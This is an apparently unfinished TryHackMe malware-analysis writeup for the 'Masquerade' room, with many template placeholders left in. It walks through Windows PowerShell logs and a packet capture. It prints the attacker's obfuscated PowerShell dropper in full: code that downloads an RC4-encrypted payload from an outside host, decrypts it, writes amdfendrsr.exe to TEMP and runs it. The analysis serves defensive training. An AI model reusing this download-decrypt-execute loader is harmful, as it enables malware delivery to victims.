# Cyber Exercise Writeup: Masquerade | https://tryhackme.com/room/masquerade

## BLUF

**Bottom Line Up Front:**  
<Provide a 2–4 sentence executive summary of what happened, why it mattered, and the final outcome.>

Example:

> The exercise demonstrated how exposed credentials and weak service configuration can enable initial access, lateral movement, and privilege escalation. Enumeration identified an externally accessible web service, which led to credential discovery and unauthorized system access. The attack path highlights the need for stronger access controls, credential hygiene, and continuous monitoring aligned with DoD cyber defense priorities.

---

## Executive Summary

**Exercise Name:** Masquerade  
**Platform / Environment:** TryHackMe  
**Exercise Type:** Malware Analysis / Forensics  
**Primary Domain:** Network DefenseEndpoint Analysis / Threat Hunting / Incident Response / Forensics  
**Difficulty:** Medium  
**Date Completed:** <YYYY-MM-DD>  
**Author:** Justin Applebury  
**Classification / Handling:** Unclassified / Training Only  

### Mission Relevance

Explain how this exercise relates to federal, military, or intelligence community cyber operations.

Example:

> This exercise reinforces skills relevant to defensive cyberspace operations, including service enumeration, threat detection, vulnerability validation, incident response triage, and adversary behavior analysis.

---

# 1. Scope and Objectives

## Scope

**Target System / Network:** Event Log, Packet Capture  
**Rules of Engagement:** Malware analysis in an isolated environment  
**Assumptions:** Jim from Finance ran a script "apply critical security updates" from a phishing email. Unusual network traffic was observed.  
**Limitations:** Analyze Event Log and Packet Capture and analyze malicious code in packets, but do not run any code outside the isolated environment.  

## Objectives

- Investigate what happened
- Determine the impact
- Identify how the attacker established control over the system
- What external domain was contacted during script execution?
- What encryption algorithm was used by the script?
- What key was used to decrypt the second-stage payload?
- What was the timestamp of the server response containing the payload?
- What is the SHA-256 hash of the extracted and decrypted payload?
- What remote URL did the client use to communicate with the victim machine?
- Which encryption key and algorithm does the client use?
- After determining the client's encryption, decrypt the commands the attacker executed on the victim and submit the flag.

---

# 2. Environment Details

| Field | Details |
|---|---|
| Target IP / Hostname | `<target>` |
| Attacker / Analyst System | `<Kali / Ubuntu / Windows / REMnux / Security Onion>` |
| Operating System Identified | `<Linux / Windows / Unknown>` |
| Network Segment | `<Lab VPN / Local Range / Cloud Range>` |
| Tools Used | `<Nmap, Burp, Wireshark, Splunk, Velociraptor, etc.>` |
| Access Level at Start | `<Unauthenticated / User / Analyst / Admin>` |
| Final Access Level | `<User / Root / Administrator / Domain Admin / N/A>` |

---

# 3. BLUF Technical Findings

| Finding | Severity | Operational Impact | Evidence |
|---|---:|---|---|
| `<Finding 1>` | `<Low/Med/High/Critical>` | `<Mission or system impact>` | `<Command/output/log/source>` |
| `<Finding 2>` | `<Low/Med/High/Critical>` | `<Mission or system impact>` | `<Command/output/log/source>` |
| `<Finding 3>` | `<Low/Med/High/Critical>` | `<Mission or system impact>` | `<Command/output/log/source>` |

---

# 4. Methodology

## Approach
## Event Log

First lets examine the Event Log  
  
><img width="958" height="281" alt="image" src="https://github.com/user-attachments/assets/7b2c0654-a978-4a8b-ae65-90cdd5ad6e49" />
  
Here we see that in the course of 21 seconds PowerShell was launched and ran several commands, likely due to an automated PowerShell script.  
  
Let's investigate the logs:  
The first three Information Level alerts just tells us that PowerShell was started with information on the affected User and Computer:  
>User: S-1-5-21-753961636-1548247123-2641200033-1001  
>Computer: DESKTOP-I6C5C7M
  
The first Verbose alert is a simple script block creating a prompt to accept input into PowerShell. The ScriptBlockID is just a unique Identifier for this particular ScriptBlock and doesn't contain any important information by itself.  
  
The second Verbose alert is where things get interesting. The ScriptBlockText is **.\updates.ps1** which is a command to run updates.ps1 script that is in the current working directory. We will note this filename and look for it in later logs and the Network Packet Capture.  
  
The third Verbose alert shows us the details of the script that is being run:  
><img width="1125" height="176" alt="image" src="https://github.com/user-attachments/assets/7cfdc375-4365-4bd1-85ea-ec0daa720c79" />  
This script is being obfuscated to attempt to avoid Intrusion Detection Systems(IDS) and to make the Forensic Analyst's job harder.
>$k = [System.Text.Encoding]::UTF8.GetBytes(('X9vT3pL'+'2QwE'+'8xR6'+'ZkYhC4'+'s'))
  
This piece of script is defining variable $k and using this UTF8 encoding function to concatinate these individual strings in an attempt to hide the true value of the key which is **X9vT3pL2QwE8xR6ZkYhC4s** and we will take note of this because we will likely use this key to decrypt payloads in our packet capture.  
>$h = (New-Object System.Net.WebClient).DownloadString((-join('ht','tp','://','api-edg','e','cl','oud.xy','z/amd.bi','n'))) -replace ('\'+'s'),''

This piece of code is defining variable **$h** and again by using functions that manipulate strings to obfuscate the true value being assigned to this variable.  
  
A quick rundown is that **join()** will concatinate the individual strings, and **replace()** will delete any whitespace because **\s** is the RegEx for whitespace and it's replacing those with '' which is a blank string.  

This is downloading the payload from **hxxp://api-edgecloud[.]xyz/amd[.]bin**  (NOTE: This is a defanged URL in order to protect people reading this report from inadvertantly going to the infected URL)
  
>$b = for($x=0; $x -lt $h.Length; $x+=2) { [Convert]::ToByte($h.Substring($x, 2), 16) }
  
I'm going to reformat this portion of code to make it more readable.  

>````
>     $b = for($x=0; $x -lt $h.Length; $x+=2)
>    {
>        [Convert]::ToByte($h.Substring($x, 2), 16)
>    }
>````

This is a simple code block that is converting every two hex characters into a byte.  
A quick breakdown is that $x is initialized at 0 and as long as $x is less than (the -lt) the length of variable $h it will execute the code inside the {} and then add 2 to $x.  
The code inside the loop statement is extracting the portion of $h from $x to $x+2 base 16 into a byte and adds it to the array $b.  
  
>$s = 0..255 $j = 0 for ($i = 0; $i -lt 256; $i++) { $j = ($j + $s[$i] + $k[$i % $k.Count]) % 256 $temp = $s[$i]; $s[$i] = $s[$j]; $s[$j] = $temp } $i = $j = 0 $d = foreach ($byte in $b) { $i = ($i + 1) % 256 $j = ($j + $s[$i]) % 256 $temp = $s[$i]; $s[$i] = $s[$j]; $s[$j] = $temp $byte -bxor $s[($s[$i] + $s[$j]) % 256] }
  
Let's reformat this into something more readable than a long string of characters.  

>````
>    $s = 0..255
>    $j = 0
>    for ($i = 0; $i -lt 256; $i++) {
>        $j = ($j + $s[$i] + $k[$i % $k.Count]) % 256
>        $temp = $s[$i]; $s[$i] = $s[$j]; $s[$j] = $temp
>    }
>    $i = $j = 0
>    $d = foreach ($byte in $b) {
>        $i = ($i + 1) % 256
>        $j = ($j + $s[$i]) % 256
>        $temp = $s[$i]; $s[$i] = $s[$j]; $s[$j] = $temp
>        $byte -bxor $s[($s[$i] + $s[$j]) % 256]
>    }
>````
  This is taking the key we found earlier and convert it into a pseudo-randomized 256-byte vector that is used to encrypt and decrypt a payload. This is known as the RC4 Key-Scheduling Algorithm (KSA)  
  We will take note of this because we will likely use this in Cyberchef later to help us decrypt payloads we find in the packet capture. One more note is that XOR is being used against the payload.

>````
>    $p = $env:TEMP + '\amdfendrsr.exe'
>    [System.IO.File]::WriteAllBytes($p, $d)
>    Start-Process $p
>````

Finally this takes the decrypted payload and saves it to the TEMP directory as amdfendrsr.exe and executes it.  


## Packet Capture

The Packet Capture that we have has 4342 packets in total, far too many to look at one at a time, so we will use Wireshark to help us filter down and find the important packets.  
We have a few different ways to filter and search, we can look at the same timeframe as the Windows Log, or look for the filename amdfendrsr.exe, me personally I'm going to filter out DNS packets and look for the malicious URL.  

<img width="1261" height="293" alt="image" src="https://github.com/user-attachments/assets/bb345bdb-8e75-4d9e-a0f4-1d5507e28851" />  

  Here we find the DNS query and response for the malicious URL. And the resolved IP address 34[.]174[.]85[.]91


## Phases

1. Reconnaissance
2. Enumeration
3. Vulnerability identification
4. Exploitation or investigation
5. Post-exploitation or evidence review
6. Privilege escalation or impact analysis
7. Defensive recommendations
8. Reporting

---

# 5. Reconnaissance and Enumeration

## Network Discovery

Command:

```bash
<command here>
